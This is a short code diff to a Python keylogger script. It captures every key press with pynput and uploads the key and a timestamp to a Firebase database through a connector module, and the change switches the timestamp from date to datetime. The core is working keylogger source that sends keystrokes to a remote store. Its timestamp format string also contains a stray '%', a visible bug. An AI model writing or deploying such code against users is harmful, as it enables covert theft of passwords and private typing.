@@ -1,9 +1,6 @@
 from pynput import keyboard
 import firebaseConnector
-from datetime import date
-
-today = date.today()
-# import recorder
+from datetime import datetime
 
 print("Starting Key Logger Program")
 print("----------------------------------")
@@ -15,7 +12,7 @@ firebaseConnector = firebaseConnector.FirebaseConnector()
 def on_press(key):
     try:
         print(key.char + " Pressed")
-        keyPressTime = date.today().strftime("%d-%m-%Y_%H:%M%:%S")
+        keyPressTime = datetime.now().strftime("%d-%m-%Y_%H:%M%:%S")
         # Call keypress function
         firebaseConnector.storeKeypressData(
             {"keyPressed": key.char, "timeStamp": keyPressTime})
